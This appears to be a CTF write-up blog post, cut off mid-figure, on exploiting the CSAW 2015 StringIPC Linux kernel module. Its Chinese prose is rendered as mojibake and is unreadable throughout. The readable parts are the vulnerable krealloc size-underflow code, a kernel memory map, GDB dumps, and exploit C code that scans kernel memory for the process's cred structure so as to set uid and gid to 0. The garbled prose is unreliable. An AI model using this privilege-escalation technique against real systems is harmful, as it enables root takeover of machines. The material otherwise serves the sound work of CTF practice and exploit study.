        <content type="html"><![CDATA[<h3 id="Kernel-pwn-SringsIPC-P1"><a href="#Kernel-pwn-SringsIPC-P1" class="headerlink" title="Kernel_pwn SringsIPC(P1)"></a>Kernel_pwn SringsIPC(P1)</h3><blockquote><p>ä»ä»»æ„åœ°å€è¯»å†™åˆ°ææƒçš„ä¸‰ç§æ–¹æ³•ï¼š<br>1.ä¿®æ”¹credç»“æ„ä½“<br>2.æ”¹å†™vdsoæ˜ å°„å‡½æ•°+åå¼¹shell<br>3.åŠ«æŒprctlæ‰§è¡Œè¿‡ç¨‹çš„hp-&gt;hookæŒ‡é’ˆ</p></blockquote><p>è¿™é“é¢˜æ¥è‡ªcsaw-2015-ctfä¹Ÿæ˜¯ä¸€é“ç»å…¸çš„å†…æ ¸é¢˜äº†ï¼ŒèŠ±äº†è›®ä¹…çš„æ—¶é—´å»å¤ç°ğŸ¤¦</p><span id="more"></span><p>è¿™é¢˜åªç»™äº†ç¨‹åºçš„æºä»£ç main.cï¼Œéœ€è¦æˆ‘ä»¬è‡ªå·±æ­å»ºç¯å¢ƒã€‚æˆ‘æ˜¯æ‡’ç‹—ï¼Œç›´æ¥ç”¨äº†p4ndaå¸ˆå‚…çš„é•œåƒå’Œæ–‡ä»¶ç³»ç»Ÿï¼ˆååˆ†æ„Ÿè°¢ï¼ğŸ˜ï¼‰ã€‚<br>æ ¹æ®é¢˜ç›®çš„åå­—çŒœæµ‹å¯èƒ½æ˜¯å®ç°äº†è¿›ç¨‹é—´é€šä¿¡è¿‡ç¨‹ä¸­çš„çš„ä¿¡ç®±æœºåˆ¶ï¼ˆæ­£å¥½æœ€è¿‘åœ¨åšæ“ä½œç³»ç»Ÿçš„IPCå®éªŒï¼‰ï¼Œä½†å®é™…ä¸Šæ˜¯æˆ‘æƒ³å¤šäº†ã€‚</p><p>åˆ†ææºç å‘ç°ç¨‹åºå®ç°äº†å¯¹ä¸€ç‰‡å†…å­˜åŒºåŸŸçš„ç”³è¯·ï¼Œé‡Šæ”¾ï¼Œè¯»å†™ï¼Œæ‰©å®¹ï¼ŒæŸ¥å¯»æ“ä½œã€‚<br>æ¼æ´ç‚¹åœ¨æ‰©å®¹æ“ä½œ(realloc)å‡½æ•°ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">realloc_ipc_channel</span> <span class="params">( <span class="keyword">struct</span> ipc_state *state, <span class="type">int</span> id, <span class="type">size_t</span> size, <span class="type">int</span> grow )</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_channel</span> *<span class="title">channel</span>;</span></span><br><span class="line">    <span class="type">size_t</span> new_size;</span><br><span class="line">    <span class="type">char</span> *new_data;</span><br><span class="line"></span><br><span class="line">    channel = get_channel_by_id(state, id);</span><br><span class="line">    <span class="keyword">if</span> ( IS_ERR(channel) )</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(channel);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( grow )</span><br><span class="line">        new_size = channel-&gt;buf_size + size;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        new_size = channel-&gt;buf_size - size;</span><br><span class="line"></span><br><span class="line">    new_data = krealloc(channel-&gt;data, new_size + <span class="number">1</span>, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> ( new_data == <span class="literal">NULL</span> )</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">    channel-&gt;data = new_data;</span><br><span class="line">    channel-&gt;buf_size = new_size;</span><br><span class="line"></span><br><span class="line">    ipc_channel_put(state, channel);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>kreallocå‡½æ•°new_sizeæ˜¯ç”±channel-&gt;buf_size-sizeå¾—åˆ°çš„ï¼Œè¿™ä¸¤ä¸ªå€¼éƒ½å¯æ§ï¼Œä»è€Œå¯ä»¥ä½¿å¾—new_size+1&#x3D;&#x3D;0ã€‚æ ¹æ®kreallocå‡½æ•°æºç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * krealloc - reallocate memory. The contents will remain unchanged.</span></span><br><span class="line"><span class="comment"> * @p: object to reallocate memory for.</span></span><br><span class="line"><span class="comment"> * @new_size: how many bytes of memory are required.</span></span><br><span class="line"><span class="comment"> * @flags: the type of memory to allocate.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The contents of the object pointed to are preserved up to the</span></span><br><span class="line"><span class="comment"> * lesser of the new and old sizes.  If @p is %NULL, krealloc()</span></span><br><span class="line"><span class="comment"> * behaves exactly like kmalloc().  If @new_size is 0 and @p is not a</span></span><br><span class="line"><span class="comment"> * %NULL pointer, the object pointed to is freed.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Return: pointer to the allocated memory or %NULL in case of error</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">krealloc</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *p, <span class="type">size_t</span> new_size, <span class="type">gfp_t</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">void</span> *ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!new_size)) &#123;</span><br><span class="line">kfree(p);</span><br><span class="line"><span class="keyword">return</span> ZERO_SIZE_PTR;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ret = __do_krealloc(p, new_size, flags);</span><br><span class="line"><span class="keyword">if</span> (ret &amp;&amp; kasan_reset_tag(p) != kasan_reset_tag(ret))</span><br><span class="line">kfree(p);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœä¼ å…¥çš„sizeä¸º0ï¼Œä¼šè¿”å›ZERO_SIZE_PTR(<code>#define ZERO_SIZE_PTR ((void *)16)</code>)ï¼Œå³ä¸º0x10(è€Œä¸æ˜¯0!!!)ï¼Œæ­¤æ—¶æœ‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">channel-&gt;buf_size = new_size == 0x10</span><br><span class="line">channel-&gt;buf_size = new_size == 0xffffffffffffffff(size_tæ— ç¬¦å·)</span><br></pre></td></tr></table></figure><p>å¦‚æœå°†channel-&gt;indexèµ‹å€¼ä¸ºtarget_addr-0x10ï¼Œæ ¹æ®read&#x2F;writeçš„åŠŸèƒ½å¯ä»¥ç»•è¿‡sizeçš„é™åˆ¶ä»è€Œå®ç°ä»»æ„åœ°å€è¯»å†™ğŸ™Œã€‚</p><h4 id="åˆ©ç”¨æ–¹æ³•"><a href="#åˆ©ç”¨æ–¹æ³•" class="headerlink" title="åˆ©ç”¨æ–¹æ³•"></a>åˆ©ç”¨æ–¹æ³•</h4><p>å¯ä»¥ä»»æ„åœ°å€è¯»å†™äº†ï¼Œè¦å¦‚ä½•ææƒå‘¢ï¼Ÿå…±å­¦åˆ°äº†ä¸‰ç§å§¿åŠ¿</p><h5 id="1-ä¿®æ”¹è¿›ç¨‹credç»“æ„ä½“"><a href="#1-ä¿®æ”¹è¿›ç¨‹credç»“æ„ä½“" class="headerlink" title="1.ä¿®æ”¹è¿›ç¨‹credç»“æ„ä½“"></a>1.ä¿®æ”¹è¿›ç¨‹credç»“æ„ä½“</h5><p>åšè¿‡äº†babydriveré‚£é¢˜å°±æ¯”è¾ƒå®¹æ˜“æƒ³åˆ°çš„è¦ä¿®æ”¹credç»“æ„ä½“äº†ï¼Œä½†è¦æ€ä¹ˆæ‰¾åˆ°credçš„åœ°å€å‘¢ï¼Ÿè™½ç„¶æˆ‘ä»¬å·²ç»å¯ä»¥ä»»æ„åœ°å€è¯»äº†ï¼Œä½†è¦è¯»å“ªé‡Œæ‰èƒ½è¯»åˆ°credå‘¢ï¼Ÿå¤´å¤§ã€‚ã€‚ã€‚<br>çœ‹äº†raycpå¸ˆå‚…çš„åšå®¢å­¦åˆ°äº†å¯»æ‰¾credç»“æ„ä½“çš„æ–¹æ³•tqlï¼ã€‚<br>é¦–å…ˆçº¿ç¨‹ç”±äºè¦ä½¿ç”¨æ‰€å±è¿›ç¨‹çš„èµ„æºï¼Œåœ¨å…¶thread_infoç»“æ„å—ä¸­æœ‰ä¸€ä¸ªstruct task_structç±»å‹çš„ç»“æ„ä½“ï¼Œå…¶å†…å®¹ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">struct task_struct &#123;</span><br><span class="line">...</span><br><span class="line">/* process credentials */</span><br><span class="line">conststruct cred __rcu *ptracer_cred; /* Tracer&#x27;s credentials at attach */</span><br><span class="line">conststruct cred __rcu *real_cred; /* objective and real subjective task</span><br><span class="line">* credentials (COW) */</span><br><span class="line">conststruct cred __rcu *cred;    /* effective (overridable) subjective task</span><br><span class="line">* credentials (COW) */</span><br><span class="line">char comm[TASK_COMM_LEN]; /* executable name excluding path</span><br><span class="line">- access with[gs]et_task_comm (which lock</span><br><span class="line">                       it with task_lock())</span><br><span class="line">- initialized normally by setup_new_exec */</span><br><span class="line">...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æ‰€å…³å¿ƒçš„<code>conststruct cred __rcu *cred; conststruct cred __rcu *real_cred;</code>,è¿˜æœ‰ä¸€ä¸ªé‡è¦çš„åœ°æ–¹åœ¨äº<code>char comm[TASK_COMM_LEN];</code>ï¼Œè¿™ä¸ªå­—ç¬¦æ•°ç»„ä¿å­˜äº†è¿›ç¨‹çš„åå­—ï¼Œä¹Ÿä¸ºæˆ‘ä»¬å¯»æ‰¾credæä¾›äº†æ–¹æ³•ã€‚<br>é¦–å…ˆï¼Œtask_structæ‰€éœ€çš„å†…å­˜æ˜¯åŠ¨æ€åˆ†é…å¾—åˆ°çš„ï¼Œæˆ‘ä»¬çŸ¥é“é€šè¿‡<code>kmem_cache_alloc_node</code>å‡½æ•°ç”³è¯·çš„ç©ºé—´æ˜¯åœ¨å†…æ ¸çš„åŠ¨æ€åˆ†é…åŒºåŸŸã€‚é€šè¿‡ä¸‹é¢çš„å†…æ ¸æ˜ å°„ç©ºé—´å¯ä»¥ç¡®å®šçˆ†ç ´çš„èŒƒå›´åœ¨0xffff880000000000~0xffffc80000000000ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">0xffffffffffffffff  ---+-----------+-----------------------------------------------+-------------+</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">    8M                 |           | unused hole                                   |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">0xffffffffff7ff000  ---|-----------+------------| FIXADDR_TOP |--------------------|+++++++++++++|</span><br><span class="line">    1M                 |           |                                               |+++++++++++++|</span><br><span class="line">0xffffffffff600000  ---+-----------+------------| VSYSCALL_ADDR |------------------|+++++++++++++|</span><br><span class="line">    548K               |           | vsyscalls                                     |+++++++++++++|</span><br><span class="line">0xffffffffff577000  ---+-----------+------------| FIXADDR_START |------------------|+++++++++++++|</span><br><span class="line">    5M                 |           | hole                                          |+++++++++++++|</span><br><span class="line">0xffffffffff000000  ---+-----------+------------| MODULES_END |--------------------|+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">    1520M              |           | module mapping space (MODULES_LEN)            |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">0xffffffffa0000000  ---+-----------+------------| MODULES_VADDR |------------------|+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">    512M               |           | kernel text mapping, from phys 0              |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">0xffffffff80000000  ---+-----------+------------| __START_KERNEL_map |-------------|+++++++++++++|</span><br><span class="line">    2G                 |           | hole                                          |+++++++++++++|</span><br><span class="line">0xffffffff00000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span><br><span class="line">    64G                |           | EFI region mapping space                      |+++++++++++++|</span><br><span class="line">0xffffffef00000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span><br><span class="line">    444G               |           | hole                                          |+++++++++++++|</span><br><span class="line">0xffffff8000000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span><br><span class="line">    16T                |           | %esp fixup stacks                             |+++++++++++++|</span><br><span class="line">0xffffff0000000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span><br><span class="line">    3T                 |           | hole                                          |+++++++++++++|</span><br><span class="line">0xfffffc0000000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span><br><span class="line">    16T                |           | kasan shadow memory (16TB)                    |+++++++++++++|</span><br><span class="line">0xffffec0000000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span><br><span class="line">    1T                 |           | hole                                          |+++++++++++++|</span><br><span class="line">0xffffeb0000000000  ---+-----------+-----------------------------------------------| kernel space|</span><br><span class="line">    1T                 |           | virtual memory map for all of struct pages    |+++++++++++++|</span><br><span class="line">0xffffea0000000000  ---+-----------+------------| VMEMMAP_START |------------------|+++++++++++++|</span><br><span class="line">    1T                 |           | hole                                          |+++++++++++++|</span><br><span class="line">0xffffe90000000000  ---+-----------+------------| VMALLOC_END   |------------------|+++++++++++++|</span><br><span class="line">    32T                |           | vmalloc/ioremap (1 &lt;&lt; VMALLOC_SIZE_TB)        |+++++++++++++|</span><br><span class="line">0xffffc90000000000  ---+-----------+------------| VMALLOC_START |------------------|+++++++++++++|</span><br><span class="line">    1T                 |           | hole                                          |+++++++++++++|</span><br><span class="line">0xffffc80000000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">    64T                |           | direct mapping of all phys. memory            |+++++++++++++|</span><br><span class="line">                       |           | (1 &lt;&lt; MAX_PHYSMEM_BITS)                       |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">0xffff880000000000 ----+-----------+-----------| __PAGE_OFFSET_BASE | -------------|+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">    8T                 |           | guard hole, reserved for hypervisor           |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">0xffff800000000000 ----+-----------+-----------------------------------------------+-------------+</span><br><span class="line">                       |-----------|                                               |-------------|</span><br><span class="line">                       |-----------| hole caused by [48:63] sign extension         |-------------|</span><br><span class="line">                       |-----------|                                               |-------------|</span><br><span class="line">0x0000800000000000 ----+-----------+-----------------------------------------------+-------------+</span><br><span class="line">    PAGE_SIZE          |           | guard page                                    |xxxxxxxxxxxxx|</span><br><span class="line">0x00007ffffffff000 ----+-----------+--------------| TASK_SIZE_MAX | ---------------|xxxxxxxxxxxxx|</span><br><span class="line">                       |           |                                               |  user space |</span><br><span class="line">                       |           |                                               |xxxxxxxxxxxxx|</span><br><span class="line">                       |           |                                               |xxxxxxxxxxxxx|</span><br><span class="line">                       |           |                                               |xxxxxxxxxxxxx|</span><br><span class="line">    128T               |           | different per mm                              |xxxxxxxxxxxxx|</span><br><span class="line">                       |           |                                               |xxxxxxxxxxxxx|</span><br><span class="line">                       |           |                                               |xxxxxxxxxxxxx|</span><br><span class="line">                       |           |                                               |xxxxxxxxxxxxx|</span><br><span class="line">0x0000000000000000 ----+-----------+-----------------------------------------------+-------------+</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰è¿™é‡Œä»‹ç»ä¸€ä¸ªå…³é”®çš„å‡½æ•°int prctl( int option,unsigned long arg2,unsigned long arg3,unsigned long arg4,unsigned long arg5 )ï¼Œè¿™æ˜¯ä¸€ä¸ªç³»ç»Ÿå‡½æ•°ï¼Œæ˜¯ä¸ºè¿›ç¨‹åˆ¶å®šè€Œè®¾è®¡çš„ã€‚å†…æ ¸å¯¹åº”çš„å¤„ç†å‡½æ•°ä¸ºSYSCALL_DEFINE5()ã€‚<br>å…¶ä¸­ç¬¬ä¸€ä¸ªå‚æ•°optionæŒ‡å®šæ“ä½œç±»å‹ï¼Œå¦‚æŒ‡å®šPR_SET_NAMEï¼Œå³è®¾ç½®è¿›ç¨‹åï¼Œä¹‹åçš„å‚æ•°å³ä¸ºè¡¥å……å‚æ•°ã€‚<br>å› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡æ‰§è¡Œprctl(PR_SET_NAME,target)å³å¯å®Œæˆå¯¹è¿›ç¨‹åçš„è®¾å®šã€‚</p><p>å› æ­¤åˆ©ç”¨æ–¹æ³•å°±å¾ˆæ˜ç¡®äº†ï¼š<br>1.prctlå‡½æ•°è®¾ç½®è¿›ç¨‹æ˜ã€‚<br>2.åˆ©ç”¨ioctl(fd,CSAW_SHRINK_CHANNEL,&amp;shrink_channel)è§¦å‘æ¼æ´(channel-&gt;date&#x3D;0x10 channel-&gt;buf_size&#x3D;0xffffffffffffffff)ã€‚<br>3.åˆ©ç”¨ä»»æ„åœ°å€è¯»åœ¨0xffff880000000000~0xffffc80000000000èŒƒå›´å†…åˆ©ç”¨memmem()å‡½æ•°å¯»æ‰¾è¿›ç¨‹åå­—ç¬¦ä¸²<code>char comm[TASK_COMM_LEN]</code>ã€‚<br>4.æ‰¾åˆ°credåœ°å€ååˆ©ç”¨ä»»æ„åœ°å€å†™ä¿®æ”¹uidgidä¸º0</p><p>è§¦å‘æ¼æ´ï¼š<br>call kreallocæ—¶å¯„å­˜å™¨çŠ¶æ€ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$rax   : 0xffffffffffffffff</span><br><span class="line">$rbx   : 0xffff88001f9411e0  â†’  0x0000000100000002  â†’  0x0000000100000002</span><br><span class="line">$rcx   : 0x0000000000000000  â†’  0x0000000000000000</span><br><span class="line">$rdx   : 0x00000000024000c0  â†’  0x00000000024000c0</span><br><span class="line">$rsp   : 0xffff88001f9e3e28  â†’  0xffff88001f9c5908  â†’  0x0000000000000000  â†’  0x0000000000000000</span><br><span class="line">$rbp   : 0xffff88001f9e3e48  â†’  0xffff88001f9e3e98  â†’  0xffff88001f9e3f08  â†’  0xffff88001f9e3f48  â†’  0x00007fffde817950  â†’  0x0000000000401c70  â†’  0x2b54c73d8d4c5741  â†’  0x2b54c73d8d4c5741</span><br><span class="line">$rsi   : 0x0000000000000000  â†’  0x0000000000000000    //new_size</span><br><span class="line">$rdi   : 0xffff88001fa10a00  â†’  0x0000000000000000  â†’  0x0000000000000000</span><br><span class="line">$rip   : 0xffffffffc00001a6  â†’  0xc08548c11a1355e8  â†’  0xc08548c11a1355e8</span><br><span class="line">$r8    : 0x0000000000000101  â†’  0x0000000000000101</span><br><span class="line">$r9    : 0x0000000000000000  â†’  0x0000000000000000</span><br><span class="line">$r10   : 0x0000000000000000  â†’  0x0000000000000000</span><br><span class="line">$r11   : 0x0000000000000000  â†’  0x0000000000000000</span><br><span class="line">$r12   : 0xffffffffffffffff</span><br><span class="line">$r13   : 0x0000000000000101  â†’  0x0000000000000101</span><br><span class="line">$r14   : 0x0000000000000000  â†’  0x0000000000000000</span><br><span class="line">$r15   : 0x00007fffde817890  â†’  0x00007fff00000001  â†’  0x00007fff00000001</span><br></pre></td></tr></table></figure><p>è¿”å›å€¼<code>$rax   : 0x0000000000000010  â†’  0x0000000000000010</code></p><p>èµ‹å€¼æ—¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">â†’ 0xffffffffc00001b0 &lt;realloc_ipc_channel.isra+80&gt; mov    QWORD PTR [rbx+0x8], rax</span><br><span class="line">   0xffffffffc00001b4 &lt;realloc_ipc_channel.isra+84&gt; mov    QWORD PTR [rbx+0x10], r12</span><br><span class="line"></span><br><span class="line">$rax   : 0x0000000000000010  â†’  0x0000000000000010</span><br><span class="line">$r12   : 0xffffffffffffffff</span><br></pre></td></tr></table></figure><p>å¯»æ‰¾cred:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">for</span>(;addr &lt; <span class="number">0xffffc80000000000</span>;addr += <span class="number">0x1000</span>)&#123;</span><br><span class="line">       seek_channel.id = alloc_channel.id;</span><br><span class="line">       seek_channel.index = addr<span class="number">-0x10</span>;</span><br><span class="line">       seek_channel.whence = SEEK_SET;</span><br><span class="line">       ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_channel);</span><br><span class="line">       read_channel.id = alloc_channel.id;</span><br><span class="line">       read_channel.buf = buf;</span><br><span class="line">       read_channel.count = <span class="number">0x1000</span>;</span><br><span class="line">       ioctl(fd,CSAW_READ_CHANNEL,&amp;read_channel);</span><br><span class="line">       result = memmem(buf,<span class="number">0x1000</span>,target,<span class="number">16</span>);</span><br><span class="line">       <span class="keyword">if</span> (result)</span><br><span class="line">&#123;</span><br><span class="line">cred = *(<span class="type">size_t</span> *)(result - <span class="number">0x8</span>);</span><br><span class="line">real_cred = *(<span class="type">size_t</span> *)(result - <span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">if</span>( (cred||<span class="number">0xff00000000000000</span>) &amp;&amp; (real_cred == cred))&#123;</span><br><span class="line"><span class="comment">//printf(&quot;[]%lx[]&quot;,result-(int)(buf));</span></span><br><span class="line">target_addr = addr + result-(<span class="type">int</span>)(buf);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+]found task_struct 0x%lx\n&quot;</span>,target_addr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+]found cred 0x%lx\n&quot;</span>,real_cred);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è°ƒè¯•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">gefâ¤  x/40gx 0xffff8800002034c0-0x30     //task_struct</span><br><span class="line">0xffff880000203490:0xffff8800197889680xffff880019788978</span><br><span class="line">0xffff8800002034a0:0xffff8800197889780x0000000000000000</span><br><span class="line">0xffff8800002034b0:0xffff88001f9c26000xffff88001f9c2600  //cred_addr</span><br><span class="line">0xffff8800002034c0:0x3939393939396e610x00616c6539393939  //comm</span><br><span class="line">0xffff8800002034d0:0x00000000000000000x0000000000000000</span><br><span class="line"></span><br><span class="line">gefâ¤  x/30gx 0xffff88001f9c2600    //cred</span><br><span class="line">0xffff88001f9c2600:0xffff88001f9c29000x000003e8000003e8</span><br><span class="line">0xffff88001f9c2610:0x000003e8000003e80x000003e8000003e8</span><br><span class="line">0xffff88001f9c2620:0x00000000000003e80x0000000000000000</span><br><span class="line">0xffff88001f9c2630:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff88001f9c2640:0x0000003fffffffff0x0000000000000000</span><br><span class="line">0xffff88001f9c2650:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>æ”¹å†™cred:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 